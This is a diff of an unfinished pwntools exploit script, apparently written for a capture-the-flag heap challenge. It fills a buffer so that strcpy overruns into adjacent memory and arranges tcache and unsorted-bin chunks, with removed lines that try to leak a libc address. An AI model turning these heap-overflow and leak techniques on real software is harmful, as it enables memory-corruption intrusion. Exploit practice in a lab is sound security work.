@@ -50,34 +50,28 @@ p.sendafter('> ', payload)
 # The read call limits to 0x20 bytes, so this:
 # Now when we send the second part:
 add(0, 0x10, b'A'*0x10)  
+
 payload2 = b'A' * 0x20    # Fill UwU_buf completely
+
 p.send(payload2)          # Use send instead of sendline to avoid newline
 # strcpy will continue past UUUwwUUU into UwUUwUUwUUwU
+
+show(0)
+
+#free(0)
+
+for i in range (1, 0x10):
+	add(i, 0x90, b'B'*0x10) 
+for i in range (1, 9):
+	add(i, 0x90, b'B'*0x10) 
+add(0, 0x90, b'B'*0x10) 
+payload2 = b'A' * 0x20    # Fill UwU_buf completely
+
+p.send(payload2) 
 gdb.attach(p, s)
-free(0)
-add(0)
-for i in range(6):
-    add(i, 0x100, b'A'*0x100)  
 
-free(6)
-add(6, 0x100, b'D'*0x100)
-add(7, 0x100, b'E'*0x100) # the one that would become unsortedbin later 
-for i in range(7):
-    free(i) # 0 to 6 goes to tcachebin
-
-
-
-add(8, 0x20, b'B'*0x20) # chunk 8
-gdb.attach(p, s)
-free(7)
- # this goes to unsortedbin with some libc addresses available
-
-
-add(6, 0x20, b'c'*0x20) # 
-show(6)  # Try to leak beyond chunk boundary, leaking the libc address of the unsortedbin.
-# but the null bytes of the size metadata covered it
-free(7)
-
+for i in range (1, 9):
+	free(i)
 
 
 p.interactive()
